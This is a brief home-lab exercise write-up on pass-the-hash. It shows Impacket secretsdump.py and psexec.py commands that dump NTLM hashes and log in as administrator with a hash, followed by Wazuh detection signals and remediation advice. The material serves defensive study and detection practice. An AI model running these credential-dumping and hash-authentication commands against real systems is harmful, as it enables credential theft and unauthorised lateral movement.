# Attack Exercise — Pass-the-Hash

**MITRE ATT&CK:** T1550.002  
**Tool:** Impacket psexec.py  
**Prereq:** NTLM hash obtained via Mimikatz or secretsdump

## Attack
```bash
# Dump hashes from Windows 10 (after getting SYSTEM)
python3 secretsdump.py LAB/jsmith:Password123!@10.10.10.20

# Use hash to authenticate without password
python3 psexec.py -hashes :NTLMHASHHERE administrator@10.10.10.10
```

## Detection (Wazuh)
- Event ID 4624 — logon type 3 with NTLM authentication package
- No password in logon — lateral movement indicator
- Wazuh rule 100003 fires at level 12

## Evidence
Add screenshot of Wazuh alert here

## Remediation
- Enable Protected Users security group for privileged accounts
- Disable NTLM where possible — enforce Kerberos
- Deploy Windows Defender Credential Guard
